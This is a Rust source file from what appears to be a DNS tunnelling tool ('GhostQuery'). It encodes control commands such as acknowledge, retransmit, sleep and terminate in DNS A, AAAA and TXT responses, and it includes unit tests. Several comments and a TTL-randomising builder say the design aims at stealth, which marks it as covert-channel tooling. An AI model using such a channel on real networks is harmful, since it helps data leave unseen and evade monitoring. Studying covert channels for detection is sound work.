//! DNS response handling for control signaling.
//!
//! Encodes commands in DNS response RDATA:
//! - A records: Command in last octet (127.0.0.X)
//! - AAAA records: Extended command space
//! - TXT records: Larger payloads for complex commands

use std::net::{Ipv4Addr, Ipv6Addr};

use crate::common::constants::{DEFAULT_TTL, MAX_TTL, MIN_TTL};
use crate::common::error::{GhostQueryError, Result};
use crate::common::types::{ChunkId, Command, ControlResponse, DnsRecordType};
use crate::protocol::commands::CommandHandler;

/// A DNS response carrying control information
#[derive(Debug, Clone)]
pub struct DnsResponse {
    /// Record type of the response
    pub record_type: DnsRecordType,
    /// TTL value (for caching stealth)
    pub ttl: u32,
    /// The control response decoded from RDATA
    pub control: ControlResponse,
    /// Raw A record if present
    pub a_record: Option<Ipv4Addr>,
    /// Raw AAAA record if present
    pub aaaa_record: Option<Ipv6Addr>,
    /// Raw TXT record if present
    pub txt_record: Option<String>,
}

impl DnsResponse {
    /// Create an ACK response
    pub fn ack() -> Self {
        let handler = CommandHandler::new();
        Self {
            record_type: DnsRecordType::A,
            ttl: DEFAULT_TTL,
            control: ControlResponse::ack(),
            a_record: Some(handler.ack_response()),
            aaaa_record: None,
            txt_record: None,
        }
    }

    /// Create a retransmit request response
    pub fn retransmit(chunk_id: ChunkId) -> Self {
        let handler = CommandHandler::new();
        Self {
            record_type: DnsRecordType::A,
            ttl: MIN_TTL, // Short TTL for retransmit requests
            control: ControlResponse::retransmit(chunk_id),
            a_record: Some(handler.encode_retransmit(chunk_id)),
            aaaa_record: None,
            txt_record: None,
        }
    }

    /// Create a sleep command response
    pub fn sleep(duration_secs: u32) -> Self {
        let handler = CommandHandler::new();
        Self {
            record_type: DnsRecordType::A,
            ttl: duration_secs.min(MAX_TTL), // TTL matches sleep duration
            control: ControlResponse::sleep(duration_secs),
            a_record: Some(handler.encode_sleep(duration_secs as u8)),
            aaaa_record: None,
            txt_record: None,
        }
    }

    /// Create a complete response
    pub fn complete() -> Self {
        let handler = CommandHandler::new();
        Self {
            record_type: DnsRecordType::A,
            ttl: DEFAULT_TTL,
            control: ControlResponse::complete(),
            a_record: Some(handler.complete_response()),
            aaaa_record: None,
            txt_record: None,
        }
    }

    /// Create a terminate response
    pub fn terminate() -> Self {
        let handler = CommandHandler::new();
        Self {
            record_type: DnsRecordType::A,
            ttl: MIN_TTL,
            control: ControlResponse::terminate(),
            a_record: Some(handler.encode_command(Command::Terminate)),
            aaaa_record: None,
            txt_record: None,
        }
    }

    /// Create an NXDOMAIN response (used for successful writes)
    pub fn nxdomain() -> Self {
        Self {
            record_type: DnsRecordType::A,
            ttl: DEFAULT_TTL,
            control: ControlResponse::ack(),
            a_record: None,
            aaaa_record: None,
            txt_record: None,
        }
    }

    /// Parse a response from an A record
    pub fn from_a_record(ip: Ipv4Addr, ttl: u32) -> Result<Self> {
        let handler = CommandHandler::new();
        let control = handler.decode_command(ip)?;

        Ok(Self {
            record_type: DnsRecordType::A,
            ttl,
            control,
            a_record: Some(ip),
            aaaa_record: None,
            txt_record: None,
        })
    }

    /// Parse a response from an AAAA record
    pub fn from_aaaa_record(ip: Ipv6Addr, ttl: u32) -> Result<Self> {
        // AAAA records use last 4 bytes similar to A records
        let octets = ip.octets();
        let a_equivalent = Ipv4Addr::new(octets[12], octets[13], octets[14], octets[15]);

        let handler = CommandHandler::new();
        let control = handler.decode_command(a_equivalent)?;

        Ok(Self {
            record_type: DnsRecordType::AAAA,
            ttl,
            control,
            a_record: None,
            aaaa_record: Some(ip),
            txt_record: None,
        })
    }

    /// Parse a response from a TXT record
    pub fn from_txt_record(txt: &str, ttl: u32) -> Result<Self> {
        // TXT records can carry more complex commands
        // Format: COMMAND:PARAM1:PARAM2
        let parts: Vec<&str> = txt.split(':').collect();

        let command = match parts.first() {
            Some(&"ACK") => Command::Ack,
            Some(&"RETX") => Command::Retransmit,
            Some(&"SLEEP") => Command::Sleep,
            Some(&"TERM") => Command::Terminate,
            Some(&"DONE") => Command::Complete,
            Some(&"ERR") => Command::Error,
            _ => return Err(GhostQueryError::InvalidCommand(0)),
        };

        let chunk_id = if command == Command::Retransmit {
            parts
                .get(1)
                .and_then(|s| s.parse::<u32>().ok())
                .map(ChunkId::new)
        } else {
            None
        };

        let parameter = if command == Command::Sleep {
            parts.get(1).and_then(|s| s.parse::<u32>().ok())
        } else {
            None
        };

        Ok(Self {
            record_type: DnsRecordType::TXT,
            ttl,
            control: ControlResponse {
                command,
                chunk_id,
                parameter,
            },
            a_record: None,
            aaaa_record: None,
            txt_record: Some(txt.to_string()),
        })
    }

    /// Get the command from this response
    pub fn command(&self) -> Command {
        self.control.command
    }

    /// Check if this is an acknowledgment
    pub fn is_ack(&self) -> bool {
        self.control.command == Command::Ack
    }

    /// Check if this requests retransmission
    pub fn is_retransmit(&self) -> bool {
        self.control.command == Command::Retransmit
    }

    /// Check if this is a sleep command
    pub fn is_sleep(&self) -> bool {
        self.control.command == Command::Sleep
    }

    /// Check if session is complete
    pub fn is_complete(&self) -> bool {
        self.control.command == Command::Complete
    }

    /// Get chunk ID for retransmission
    pub fn retransmit_chunk(&self) -> Option<ChunkId> {
        if self.is_retransmit() {
            self.control.chunk_id
        } else {
            None
        }
    }

    /// Get sleep duration
    pub fn sleep_duration(&self) -> Option<u32> {
        if self.is_sleep() {
            self.control.parameter
        } else {
            None
        }
    }
}

/// Response builder with TTL randomization for stealth
pub struct ResponseBuilder {
    base_ttl: u32,
    randomize_ttl: bool,
}

impl ResponseBuilder {
    pub fn new() -> Self {
        Self {
            base_ttl: DEFAULT_TTL,
            randomize_ttl: true,
        }
    }

    pub fn with_ttl(mut self, ttl: u32) -> Self {
        self.base_ttl = ttl;
        self
    }

    pub fn without_randomization(mut self) -> Self {
        self.randomize_ttl = false;
        self
    }

    /// Get a TTL value with optional randomization
    fn get_ttl(&self) -> u32 {
        if self.randomize_ttl {
            use rand::Rng;
            let mut rng = rand::thread_rng();
            // Add +/- 10% randomization
            let variance = (self.base_ttl as f64 * 0.1) as u32;
            let min = self.base_ttl.saturating_sub(variance);
            let max = self.base_ttl + variance;
            rng.gen_range(min..=max)
        } else {
            self.base_ttl
        }
    }

    pub fn build_ack(&self) -> DnsResponse {
        let mut response = DnsResponse::ack();
        response.ttl = self.get_ttl();
        response
    }

    pub fn build_retransmit(&self, chunk_id: ChunkId) -> DnsResponse {
        let mut response = DnsResponse::retransmit(chunk_id);
        response.ttl = MIN_TTL; // Keep short for retransmits
        response
    }

    pub fn build_complete(&self) -> DnsResponse {
        let mut response = DnsResponse::complete();
        response.ttl = self.get_ttl();
        response
    }
}

impl Default for ResponseBuilder {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ack_response() {
        let response = DnsResponse::ack();
        assert!(response.is_ack());
        assert!(response.a_record.is_some());
    }

    #[test]
    fn test_retransmit_response() {
        let chunk_id = ChunkId::new(42);
        let response = DnsResponse::retransmit(chunk_id);

        assert!(response.is_retransmit());
        assert_eq!(response.retransmit_chunk(), Some(chunk_id));
    }

    #[test]
    fn test_sleep_response() {
        let response = DnsResponse::sleep(60);

        assert!(response.is_sleep());
        assert_eq!(response.sleep_duration(), Some(60));
    }

    #[test]
    fn test_from_a_record() {
        let ip = Ipv4Addr::new(127, 0, 0, 0); // ACK
        let response = DnsResponse::from_a_record(ip, 300).unwrap();

        assert!(response.is_ack());
    }

    #[test]
    fn test_from_txt_record() {
        let response = DnsResponse::from_txt_record("RETX:42", 300).unwrap();

        assert!(response.is_retransmit());
        assert_eq!(response.retransmit_chunk(), Some(ChunkId::new(42)));
    }

    #[test]
    fn test_response_builder() {
        let builder = ResponseBuilder::new().with_ttl(600).without_randomization();

        let response = builder.build_ack();
        assert_eq!(response.ttl, 600);
    }
}

